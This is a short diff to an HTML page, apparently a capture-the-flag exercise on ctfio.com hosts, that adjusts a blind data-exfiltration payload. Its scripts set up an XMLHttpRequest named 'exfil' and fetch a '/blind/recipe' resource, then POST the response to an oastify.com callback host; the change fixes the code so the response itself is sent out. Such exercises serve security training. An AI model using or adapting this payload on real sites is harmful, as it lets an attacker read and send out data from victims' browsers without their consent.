@@ -1,7 +1,5 @@
 <html lang="en">
     <head>
-
-
         <script>
                 exfil = new XMLHttpRequest();
                 // Set the correct server below e.g https://abcdefg.ctfio.com
@@ -12,7 +10,7 @@
         </script>
         <script>
             let x = fetch('https://jason.ctfio.com/blind/recipe').then((res) => {
-                fetch("https://fq94gnkiqlef2gdexcpoxhqgu707oxcm.oastify.com", {method: "POST", body: JSON.stringify(x)})
+                fetch("https://fq94gnkiqlef2gdexcpoxhqgu707oxcm.oastify.com", {method: "POST", body: JSON.stringify(res)})
             }
         </script>
     </head>
